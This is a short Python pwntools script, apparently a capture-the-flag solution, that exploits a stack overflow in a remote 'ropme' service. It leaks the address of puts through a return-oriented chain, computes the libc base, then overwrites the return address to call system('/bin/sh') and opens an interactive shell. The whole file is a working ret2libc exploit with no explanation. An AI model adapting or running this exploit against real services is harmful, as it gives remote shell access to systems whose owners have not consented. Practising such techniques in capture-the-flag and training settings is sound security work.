from pwn import *


puts_plt = 0x080483b0 
puts_got = 0x0804a014 
vuln = 0x0804850a
# p = process('./ropme')
p = remote("plzpwn.me",6003);
# gdb.attach(p, gdbscript = 'b *vuln+1')

print p.recv()
p.sendline(
        'A'*12 + 
        p32(puts_plt) + 
        p32(vuln+1) + 
        p32(puts_got)
        )
leak = u32(p.recv(4))
print hex(leak)
# p.interactive()

p.recv()

# libc = ELF('./libc-2.27.so')
libc = ELF('./libc-2.23.so')
libc.address = leak - libc.symbols['_IO_puts']
system = libc.symbols['system']
binsh = libc.search("/bin/sh").next()
print "system() = " + hex(system)
print "binsh() = " + hex(binsh)

p.sendline(
        'A'*12+
        p32(system)+
        p32(0)+
        p32(binsh)
        )
p.interactive()
